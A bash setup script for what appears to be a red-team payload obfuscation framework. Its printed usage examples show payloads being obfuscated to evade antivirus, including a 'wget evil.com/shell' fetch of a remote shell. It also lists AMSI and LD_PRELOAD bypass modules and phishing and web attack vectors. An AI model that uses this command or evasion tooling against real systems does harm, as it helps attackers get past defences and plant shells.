#!/bin/bash
# Advanced Payload Obfuscation Framework Setup
# Author: Rahul Raval - Cybersecurity Engineer

echo "🎯 Advanced Payload Obfuscation Framework Setup"
echo "================================================"

# Check Python version
python_version=$(python3 --version 2>&1 | grep -oP '\d+\.\d+')
if [[ $(echo "$python_version >= 3.6" | bc -l) -eq 1 ]]; then
    echo "✅ Python $python_version detected"
else
    echo "❌ Python 3.6+ required"
    exit 1
fi

# Check required tools for Linux bypasses
echo "🔧 Checking system tools..."
if command -v gcc &> /dev/null; then
    echo "✅ GCC compiler found"
else
    echo "⚠️  GCC not found - Linux bypasses may not work"
fi

# Set permissions
chmod +x main.py
echo "✅ Permissions set"

# Create output directory
mkdir -p output reports
echo "✅ Output directories created"

echo ""
echo "🚀 SETUP COMPLETE!"
echo ""
echo "QUICK START EXAMPLES:"
echo "===================="
echo ""
echo "1. Basic obfuscation:"
echo "   python3 main.py --payload \"whoami\" --chain basic --variants 3"
echo ""
echo "2. Full stealth mode:"
echo "   python3 main.py --payload \"whoami\" --chain full --variants 5 --test"
echo ""
echo "3. Windows target:"
echo "   python3 main.py --payload \"powershell Get-Process\" --target windows --variants 10"
echo ""
echo "4. Linux target with testing:"
echo "   python3 main.py --payload \"wget evil.com/shell\" --target linux --test-av"
echo ""
echo "5. Generate report:"
echo "   python3 main.py --payload \"netstat -an\" --chain stealth --output reports/analysis.json"
echo ""
echo "ADVANCED USAGE:"
echo "==============="
echo ""
echo "• Use --vector phishing for email-optimized obfuscation"
echo "• Use --vector web for web application payloads"
echo "• Use --vector network for network-based attacks"
echo ""
echo "FRAMEWORK STRUCTURE:"
echo "==================="
echo "📁 encoders/        - Base64, XOR, ROT13 encoders"
echo "📁 obfuscators/     - Unicode, junk, fragmentation"
echo "📁 bypasses/        - AMSI (Windows), LD_PRELOAD (Linux)"
echo "📁 sample_payloads/ - Test payloads for different scenarios"
echo "📁 output/          - Generated obfuscated payloads"
echo "📁 reports/         - Analysis reports and exports"
echo ""
echo "Ready for red team operations! 🔴⚡"